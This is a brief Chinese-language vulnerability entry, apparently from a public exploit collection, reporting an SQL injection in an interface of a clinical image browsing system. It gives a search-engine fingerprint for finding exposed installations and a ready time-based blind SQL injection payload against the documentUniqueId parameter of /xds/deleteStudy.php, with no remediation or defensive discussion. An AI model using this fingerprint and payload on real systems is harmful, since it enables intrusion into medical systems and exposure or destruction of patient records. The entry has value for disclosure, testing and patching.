# 科技临床浏览系统某接口存在SQL注入漏洞

科技临床浏览系统某接口 ｜ SQL注入 ｜ —
- **指纹**：`body="蓝网科技股份有限公司"`

**Payload**
```
/xds/deleteStudy.php?documentUniqueId=1';WAITFOR DELAY '0:0:5'--
```